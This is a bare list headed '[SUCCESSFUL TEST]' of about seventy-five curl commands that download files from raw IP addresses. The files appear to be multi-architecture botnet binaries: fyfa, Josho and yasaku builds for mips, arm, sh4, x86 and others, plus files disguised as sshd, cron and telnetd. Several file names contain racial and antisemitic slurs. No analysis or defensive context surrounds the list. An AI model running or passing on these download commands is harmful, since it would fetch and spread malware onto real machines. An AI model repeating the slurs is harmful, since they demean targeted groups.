[SUCCESSFUL TEST] 
curl -O http://104.236.54.99/fyfa.pcc
curl -O http://159.203.69.152/INSANEMEME
curl -O http://159.203.69.152/YallRJews
curl -O http://159.203.69.152/HarmlessNET
curl -O http://159.203.69.152/mcdonaldsW1FI
curl -O http://159.203.69.152/H4RMl3SS
curl -O http://104.236.54.99/fyfa.mpsl
curl -O http://167.99.146.93/AB4g5/Josho.mips
curl -O http://104.236.54.99/fyfa.mips
curl -O http://104.236.54.99/fyfa.sh4
curl -O http://159.203.69.152/YjDIEW
curl -O http://167.99.146.93/AB4g5/Josho.arm6
curl -O http://104.236.54.99/fyfa.arm
curl -O http://167.99.146.93/AB4g5/Josho.arm4
curl -O http://104.236.54.99/fyfa.spc
curl -O http://167.99.146.93/AB4g5/Josho.ppc
curl -O http://159.203.69.152/iJustNutted
curl -O http://159.203.69.152/JfUE
curl -O http://159.203.69.152/HIGHSOCIETY
curl -O http://167.99.178.26/AB4g5/Josho.ppc
curl -O http://159.203.69.152/PARAZITE
curl -O http://167.99.146.93/AB4g5/Josho.sh4
curl -O http://159.203.69.152/Jackkintoasock
curl -O http://167.99.178.26/AB4g5/Josho.arm6
curl -O http://159.203.69.152/WEEDISGR8
curl -O http://167.99.178.26/AB4g5/Josho.sh4
curl -O http://167.99.178.26/AB4g5/Josho.x86
curl -O http://167.99.178.26/AB4g5/Josho.mips
curl -O http://167.99.178.26/AB4g5/Josho.arm4
curl -O http://167.99.178.26/AB4g5/Josho.arm7
curl -O http://167.99.146.93/AB4g5/Josho.mpsl
curl -O http://104.236.54.99/fyfa.m68k
curl -O http://167.99.146.93/AB4g5/Josho.arm5
curl -O http://104.236.54.99/fyfa.i686
curl -O http://167.99.178.26/AB4g5/Josho.mpsl
curl -O http://104.236.54.99/fyfa.x86
curl -O http://167.99.146.93/AB4g5/Josho.x86
curl -O http://104.236.54.99/fyfa.i586
curl -O http://167.99.146.93/AB4g5/Josho.arm7
curl -O http://163.172.99.61/bash
curl -O http://163.172.99.61/pftp
curl -O http://163.172.99.61/ntpd
curl -O http://163.172.99.61/nut
curl -O http://163.172.99.61/sh
curl -O http://163.172.99.61/cron
curl -O http://163.172.99.61/telnetd
curl -O http://163.172.99.61/openssh
curl -O http://167.99.178.26/AB4g5/Josho.arm5
curl -O http://163.172.99.61/wget
curl -O http://167.99.146.93/AB4g5/Josho.m68k
curl -O http://163.172.99.61/sshd
curl -O http://167.99.178.26/AB4g5/Josho.m68k
curl -O http://185.172.164.40/bins/yasaku.arm5
curl -O http://163.172.99.61/ftp
curl -O http://163.172.99.61/apache2
curl -O http://185.172.164.40/bins/yasaku.arm4
curl -O http://185.244.25.153/bins/x86_64
curl -O http://185.140.120.48/Nigger
curl -O http://185.140.120.48/Nigger9
curl -O http://163.172.99.61/tftp
curl -O http://185.140.120.48/Nigger3
curl -O http://185.244.25.153/bins/mips
curl -O http://185.244.25.153/bins/i486
curl -O http://185.244.25.153/bins/arm7
curl -O http://185.244.25.153/bins/arm4
curl -O http://185.140.120.48/Nigger7
curl -O http://185.140.120.48/Nigger6
curl -O http://185.140.120.48/Nigger5
curl -O http://185.140.120.48/Nigger4
curl -O http://159.203.69.152/capNIGGRz
curl -O http://185.244.25.153/bins/sh4
curl -O http://185.80.128.250/cron
